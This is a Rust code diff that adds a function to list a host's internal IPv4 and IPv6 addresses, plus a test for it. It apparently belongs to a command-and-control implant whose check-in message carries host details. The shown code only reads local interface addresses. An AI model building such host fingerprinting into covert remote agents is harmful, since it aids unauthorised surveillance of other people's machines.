@@ -2,11 +2,13 @@ use std::io::{BufRead, BufReader};
 
 use errors::ThanatosError;
 use ffiwrappers::linux::{
+    ifaddrs::IfAddrsList,
+    socket::SockAddr,
     uname::{self, UtsName},
     user::UserInfo,
 };
 
-use crate::proto::checkin::{Architecture, ContainerEnv};
+use base_profile::msg::checkin::{ip_type, Architecture, ContainerEnv, IpType};
 
 mod dnsname;
 pub use dnsname::{domain, hostname};
@@ -101,6 +103,24 @@ pub fn process_name() -> Result<String, ThanatosError> {
     std::fs::read_to_string("/proc/self/comm").map_err(ThanatosError::IoError)
 }
 
+pub fn internal_ips() -> Result<Vec<IpType>, ThanatosError> {
+    let interfaces = IfAddrsList::new().map_err(ThanatosError::FFIError)?;
+
+    Ok(interfaces
+        .iter()
+        .flat_map(|interface| {
+            interface.ifa_addr().map(|address| match address {
+                SockAddr::AfInet(ipv4addr) => IpType {
+                    ip: Some(ip_type::Ip::Ipv4(ipv4addr.sin_addr().s_addr)),
+                },
+                SockAddr::AfInet6(ipv6addr) => IpType {
+                    ip: Some(ip_type::Ip::Ipv6(ipv6addr.sin6_addr().s6_addr.to_vec())),
+                },
+            })
+        })
+        .collect::<Vec<IpType>>())
+}
+
 #[cfg(test)]
 mod tests {
     #[test]
@@ -121,5 +141,11 @@ mod tests {
     #[test]
     fn process_name_ok() {
         super::process_name().unwrap();
+    }
+
+    #[test]
+    fn internal_ips() {
+        let ips = super::internal_ips().unwrap();
+        dbg!(ips);
     }
 }
